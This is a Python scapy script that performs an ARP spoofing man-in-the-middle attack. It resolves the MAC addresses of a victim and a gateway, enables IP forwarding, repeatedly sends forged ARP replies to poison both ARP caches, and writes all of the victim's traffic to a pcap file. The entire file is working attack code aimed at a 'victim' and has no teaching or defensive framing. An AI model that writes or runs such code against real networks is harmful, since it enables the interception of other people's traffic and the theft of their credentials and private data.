import os
import sys
import time
import threading
from scapy.all import ARP, Ether, srp, send, sniff, wrpcap

# Target details
victim_ip = "192.168.31.132"      # Change to your victim
gateway_ip = "192.168.31.1"       # Change to your router

# Get MAC addresses
def get_mac(ip):
    arp_req = ARP(pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    pkt = ether/arp_req
    resp = srp(pkt, timeout=2, verbose=0)[0]
    if resp:
        return resp[0][1].hwsrc
    else:
        print(f"[-] Could not get MAC for {ip}")
        sys.exit(1)

victim_mac = get_mac(victim_ip)
gateway_mac = get_mac(gateway_ip)

print(f"[+] Victim MAC: {victim_mac}")
print(f"[+] Gateway MAC: {gateway_mac}")

# Enable IP forwarding
def enable_ip_forwarding():
    if sys.platform.startswith("linux"):
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    elif sys.platform.startswith("win"):
        os.system("netsh interface ipv4 set interface 1 forwarding=enabled")
    else:
        print("[-] Unsupported OS")
        sys.exit(1)
        
# Disable IP forwarding
def disable_ip_forwarding():
    if sys.platform.startswith("linux"):
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    elif sys.platform.startswith("win"):
        os.system("netsh interface ipv4 set interface 1 forwarding=disabled")

# Restore ARP tables
def restore():
    send(ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwsrc=gateway_mac, hwdst="ff:ff:ff:ff:ff:ff"), count=5)
    send(ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwsrc=victim_mac, hwdst="ff:ff:ff:ff:ff:ff"), count=5)
    disable_ip_forwarding()
    print("[+] ARP tables restored. Exiting.")

# ARP spoofing loop
def spoof():
    try:
        while True:
            send(ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst=victim_mac))
            send(ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwdst=gateway_mac))
            time.sleep(2)
    except KeyboardInterrupt:
        restore()
        sys.exit(0)

# Sniff packets
def packet_sniffer():
    print("[+] Starting packet capture...")
    packets = sniff(filter=f"ip host {victim_ip}", count=0, store=True)
    wrpcap("capture.pcap", packets)

# Main execution
if __name__ == "__main__":
    enable_ip_forwarding()
    print("[+] IP forwarding enabled.")
    t1 = threading.Thread(target=spoof)
    t1.start()
    try:
        packet_sniffer()
    except KeyboardInterrupt:
        restore()
